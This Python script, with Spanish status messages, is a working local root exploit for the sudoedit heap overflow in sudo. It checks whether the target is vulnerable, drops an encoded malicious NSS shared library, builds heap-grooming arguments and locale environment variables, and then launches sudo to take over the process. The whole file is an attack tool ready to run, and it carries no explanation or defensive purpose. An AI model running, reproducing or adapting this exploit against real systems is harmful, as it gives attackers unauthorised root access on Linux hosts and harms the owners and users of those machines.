import os,subprocess,sys
from ctypes import cdll, c_char_p, POINTER, c_int, c_void_p

print(" [\033[1;32m+\033[1;37m] Iniciando el exploit ")

SUDO_PATH = b"/usr/bin/sudo"

libc = cdll.LoadLibrary("libc.so.6")

LC_CATS = [
        b"LC_CTYPE", b"LC_NUMERIC", b"LC_TIME", b"LC_COLLATE", b"LC_MONETARY",
        b"LC_MESSAGES", b"LC_ALL", b"LC_PAPER", b"LC_NAME", b"LC_ADDRESS",
        b"LC_TELEPHONE", b"LC_MEASUREMENT", b"LC_IDENTIFICATION"
]

def check_is_vuln():

        r, w = os.pipe()
        pid = os.fork()
        if not pid:

                os.dup2(w, 2)
                execve(SUDO_PATH, [ b"sudoedit", b"-s", b"-A", b"/aa", None ], [ None ])
                exit(0)

        os.close(w)
        os.waitpid(pid, 0)
        r = os.fdopen(r, 'r')
        err = r.read()
        r.close()

        if "sudoedit: no askpass program specified, try setting SUDO_ASKPASS" in err:
                return True
        assert err.startswith('usage: ') or "invalid mode flags " in err, err
        return False

def create_libx(name):
        so_path = 'libnss_'+name+'.so.2'
        if os.path.isfile(so_path):
                return

        so_dir = 'libnss_' + name.split('/')[0]
        if not os.path.exists(so_dir):
                os.makedirs(so_dir)

        import zlib
        import base64

        libx_b64 = 'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'
        with open(so_path, 'wb') as f:
                f.write(zlib.decompress(base64.b64decode(libx_b64)))

def check_nscd_condition():
        if not os.path.exists('/var/run/nscd/socket'):
                return True

        import socket

        sk = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        try:
                sk.connect('/var/run/nscd/socket')
        except:
                return True
        else:
                sk.close()

        with open('/etc/nscd.conf', 'r') as f:
                for line in f:
                        line = line.strip()
                        if not line.startswith('enable-cache'):
                                continue
                        service, enable = line.split()[1:]

                        if service == 'passwd' and enable == 'yes':
                                return False

                        if service == 'group' and enable == 'yes':
                                return False

        return True

def get_libc_version():
        output = subprocess.check_output(['ldd', '--version'], universal_newlines=True)
        for line in output.split('\n'):
                if line.startswith('ldd '):
                        ver_txt = line.rsplit(' ', 1)[1]
                        return list(map(int, ver_txt.split('.')))
        return None

def check_libc_version():
        version = get_libc_version()
        assert version, "Cannot detect libc version"

        return version[0] >= 2 and version[1] >= 26

def check_libc_tcache():
        libc.malloc.argtypes = (c_int,)
        libc.malloc.restype = c_void_p
        libc.free.argtypes = (c_void_p,)

        size1, size2 = 0xd0, 0xc0
        mems = [0]*32

        for i in range(len(mems)):
                mems[i] = libc.malloc(size2)

        mem1 = libc.malloc(size1)
        libc.free(mem1)
        mem2 = libc.malloc(size2)
        libc.free(mem2)
        for addr in mems:
                libc.free(addr)
        return mem1 != mem2

def get_service_user_idx():

        idx = 0
        found = False
        with open('/etc/nsswitch.conf', 'r') as f:
                for line in f:
                        if line.startswith('#'):
                                continue
                        line = line.strip()
                        if not line:
                                continue
                        words = line.split()
                        if words[0] == 'group:':
                                found = True
                                break
                        for word in words[1:]:
                                if word[0] != '[':
                                        idx += 1

        assert found, ' [\033[1;31m!\033[1;37m] No se encuentra la base de datos "grupo" '
        return idx

def get_extra_chunk_count(target_chunk_size):

        chunk_cnt = 0

        gids = os.getgroups()
        malloc_size = len("groups=") + len(gids) * 11
        chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
        if chunk_size == target_chunk_size: chunk_cnt += 1

        import socket
        malloc_size = len("host=") + len(socket.gethostname()) + 1
        chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
        if chunk_size == target_chunk_size: chunk_cnt += 1

        try:
                import ipaddress
        except:
                return chunk_cnt
        cnt = 0
        malloc_size = 0
        proc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
        for line in proc.stdout:
                line = line.strip()
                if not line.startswith('inet'):
                        continue
                if cnt < 2:
                        cnt += 1
                        continue;
                addr = line.split(' ', 2)[1]
                mask = str(ipaddress.ip_network(addr if sys.version_info >= (3,0,0) else addr.decode("UTF-8"), False).netmask)
                malloc_size += addr.index('/') + 1 + len(mask)
                cnt += 1
        malloc_size += len("network_addrs=") + cnt - 3 + 1
        chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
        if chunk_size == target_chunk_size: chunk_cnt += 1
        proc.wait()

        return chunk_cnt

def execve(filename, argv, envp):
        libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)

        cargv = (c_char_p * len(argv))(*argv)
        cenvp = (c_char_p * len(envp))(*envp)

        libc.execve(filename, cargv, cenvp)

def lc_env(cat_id, chunk_len):
        name = b"C.UTF-8@"
        name = name.ljust(chunk_len - 0x18, b'Z')
        return LC_CATS[cat_id]+b"="+name

try:
    assert check_is_vuln(), " [\033[1;31m!\033[1;37m] La versión de sudo no es vulnerable'"
except:
    print(" [\033[1;31m!\033[1;37m] La versión de sudo no es vulnerable " )
    sys.exit()

try:
    assert check_libc_version(), " [!] La versión de glibc es demasiado antigua "
except:
    print(" [\033[1;31m!\033[1;37m] La versión de glibc es demasiado antigua ")
    sys.exit()

try:
    assert check_libc_tcache(), " [\033[1;31m!\033[1;37m] No se encontró el paquete glibc "
except:
    print(" [\033[1;31m!\033[1;37m] No se encontró el paquete glibc ")
    sys.exit()

try:
    assert check_nscd_condition(), " [\033[1;31m!\033[1;37m] El servicio nscd se está ejecutando "
except:
    print(" [\033[1;31m!\033[1;37m] El servicio nscd se está ejecutando ")

service_user_idx = get_service_user_idx()
assert service_user_idx < 9, '"group" db in nsswitch.conf is too far, idx: %d' % service_user_idx
create_libx("X/X1234")

FAKE_USER_SERVICE_PART = [ b"\\" ] * 0x18 + [ b"X/X1234\\" ]

TARGET_OFFSET_START = 0x780
FAKE_USER_SERVICE = FAKE_USER_SERVICE_PART*30
FAKE_USER_SERVICE[-1] = FAKE_USER_SERVICE[-1][:-1]

CHUNK_CMND_SIZE = 0xf0

extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) if len(sys.argv) < 2 else int(sys.argv[1])

argv = [ b"sudoedit", b"-A", b"-s", b"A"*(CHUNK_CMND_SIZE-0x10)+b"\\", None ]
env = [ b"Z"*(TARGET_OFFSET_START + 0xf - 8 - 1) + b"\\" ] + FAKE_USER_SERVICE
env.extend([ lc_env(0, 0x40)+b";A=", lc_env(1, CHUNK_CMND_SIZE) ])

for i in range(2, service_user_idx+2):
        env.append(lc_env(i if i < 6 else i+1, 0x40))
if service_user_idx == 0:
        env.append(lc_env(2, 0x20))

for i in range(11, 11-extra_chunk_cnt, -1):
        env.append(lc_env(i, CHUNK_CMND_SIZE))

env.append(lc_env(12, 0x90))
env.append(b"TZ=:")
env.append(None)

print(' [\033[1;32m+\033[1;37m] Exploit completado ')

execve(SUDO_PATH, argv, env)
